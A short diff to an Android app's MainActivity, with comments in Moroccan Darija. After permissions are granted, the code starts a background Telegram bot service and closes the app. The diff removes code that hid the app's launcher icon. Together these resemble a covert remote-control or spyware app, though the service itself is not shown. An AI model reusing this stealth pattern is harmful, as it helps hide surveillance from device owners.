@@ -38,24 +38,17 @@ public class MainActivity extends Activity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
-        // Kan-tsennaw 3 secondes bach l'app mat-mse7ch mn MIUI
+        // Kan-tsennaw chwiya w mn be3d kan-ch3lo l'service
         new Handler().postDelayed(() -> {
             try {
-                // Start l'bot
+                // Start Telegram Bot Background Service
                 startForegroundService(new Intent(this, TelegramService.class));
-
-                // Khebbi l'icone
-                getPackageManager().setComponentEnabledSetting(
-                    new android.content.ComponentName(this, MainActivity.class),
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                );
                 
-                // Sed l'app
+                // Sed l'app (kat-bqa f background)
                 finishAffinity();
             } catch (Exception e) {
                 e.printStackTrace();
             }
-        }, 3000); 
+        }, 2000); 
     }
 }
